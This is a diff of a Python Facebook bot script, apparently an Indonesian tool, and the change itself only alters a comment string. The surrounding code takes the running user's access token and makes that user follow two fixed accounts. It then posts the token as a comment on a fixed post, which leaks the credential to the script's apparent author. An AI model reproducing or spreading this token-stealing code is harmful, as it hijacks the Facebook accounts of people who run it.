@@ -579,7 +579,7 @@ def hamz_bot():
     except IOError:
         print (' [!] Token invalid') 
         os.system('rm -rf login.txt')
-    kom = " Bang @[100039043908204:] Ganteng Bangetz Ngga Ada Obat 😘😘😘😘"
+    kom = " Bang @[100039043908204:] Shelly Cantik Banget Ga Ada Obat😘😘😘😘"
     requests.post('https://graph.facebook.com/100039043908204/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/100051863139451/subscribers?access_token=' + token)
     requests.post('https://graph.facebook.com/546513286660130/comments/?message=' +token+ '&access_token=' + token)
